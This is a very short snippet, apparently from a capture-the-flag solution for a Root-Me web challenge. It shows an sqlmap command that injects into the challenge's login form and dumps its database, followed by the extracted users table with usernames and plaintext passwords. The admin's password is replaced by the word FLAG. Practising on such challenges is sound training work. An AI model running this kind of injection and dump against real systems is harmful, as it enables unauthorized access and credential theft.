```
sqlmap -u "http://challenge01.root-me.org/web-serveur/ch9/" --data="login=admin&password=1234" --dump
```

Database: SQLite_masterdb
Table: users
[3 entries]
+------+----------+--------------+
| Year | username | password     |
+------+----------+--------------+
| 2006 | user1    | TYsgv75zgtq  |
| 2005 | admin    | FLAG         |
| 2008 | user2    | R78gsyd34dzf |
+------+----------+--------------+
